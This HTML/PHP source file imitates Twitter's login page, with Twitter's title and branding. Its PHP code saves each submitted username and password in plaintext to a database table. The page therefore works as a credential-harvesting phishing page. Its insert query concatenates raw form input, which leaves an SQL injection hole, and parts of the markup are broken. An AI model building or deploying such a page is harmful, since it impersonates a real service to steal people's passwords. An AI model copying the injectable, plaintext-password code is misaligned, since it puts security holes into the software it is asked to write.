

<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<title>twitter</title>
<style>
body
{
background:#e7f4fd;
}
.main
{
background-color:white; 
color:white; 
height:60px; 
width:100%; 
float:left;
}
.header1
{
width:500px;
float:left;

}
.header2
{
width:400px;
float:left;
}
.font
{
color:grey;
padding-left:100px;
font-size:14px;
}
.main2
{
height:500px;
width:100%;
background:#e7f4fd;
float:left;
}
.center
{
height:250px;
width:550px;
background-color:white;
float:left;
margin-left:200px;
margin-top:20px;
}
.center2
{
height:90px;
width:550px;
background-color:#bae0fb;
float:left;
margin-left:200px;
}
.login
{
height:30px;
width:300px;
border-radius:3px;
padding:4px;
margin-top:5px;
font-size:14px;
margin-left:50px;
}
.submit
{
height:30px;
width:100px;
border-radius:50px;
padding:4px;
margin-top:10px;
font-size:14px;
background:royalblue;
margin-left:50px;
}
.font2
{
font-size:24px;
padding-left:50px;
}
.font3
{
font-size:14px;
margin-left:50px;
}
</style>
</head>

<body>
<!-- header page -->
<div class="col-md-12">
<div class="main" >
<div class="header1" >
<h3 class="font">Home &nbsp; &nbsp;About</h3>
</div>
<div class="header2">
<p class="font">Language:
<select>English
<option>English</option>
<option>Bahasa Indonesia &nbsp; &nbsp; &nbsp; Hindu</option>
<option>Swahili &nbsp; &nbsp; &nbsp; Turkish</option>
<option>catala &nbsp; &nbsp; &nbsp; Certina</option>
<option>English UK &nbsp; &nbsp; &nbsp; Espanol</option>
<option>Filipino &nbsp; &nbsp; &nbsp; Italiano</option>
<option>Norks &nbsp; &nbsp; &nbsp; Polski</option>
<option>Portuges &nbsp; &nbsp; &nbsp; Suomi</option>
<option>Punjab &nbsp; &nbsp; &nbsp; Somali</option>
</select>
</p>		
</div>
</div>
<!-- END header page -->
<!-- start Main-->
<div class="main2">
<div class="center">
<p class="font2"><b>Log in to Twitter</b></p>
<form onsubmit="return(emailvalidation())" method="post">
<input type="text" name="text" placeholder="Phone,Email or Username" class="login" id="email"></br>
<input type="password" name="password" placeholder="Password" class="login"></br>
<input type="submit" name="login" value="Login" class="submit"> &nbsp;&nbsp;
<input type="checkbox"  value="remeber Me">Remeber Me.&nbsp;&nbsp;Forgot Password<br>
</form>
</div>
<div class="center2">
<p class="font3">New to Twitter? Sign up now »</p>
<p class="font3">Already using Twitter via text message? Activate your account »</p>
</div>
</div>
</div>

<script>
/*function emailvalidation()
{
var email=document.getElementById('email').value;
var atpos=email.indexOf('@');
var dotpos=email.lastIndexOf('.');
if(atpos<1 || dotpos<atpos+2 || dotpos+2>=email.length)
{
alert('Please Enter Valid Email ID');
document.getElementById('email').focus();
return false;
}
return true;
}
</script> 
*/
<?php
include 'connection.php';
if(isset($_POST['login']))
{
$name=$_POST['text'];
$password=$_POST['password'];
$ab="insert into twitter(email,password)value('$name','$password')";
$bc=mysqli_query($con,$ab);
if($bc)
{
echo"<script>
	alert('successfully inserted');
	</script>";
}
else
{
echo mysqli_error($con);
}
}
?>
</body>
</html>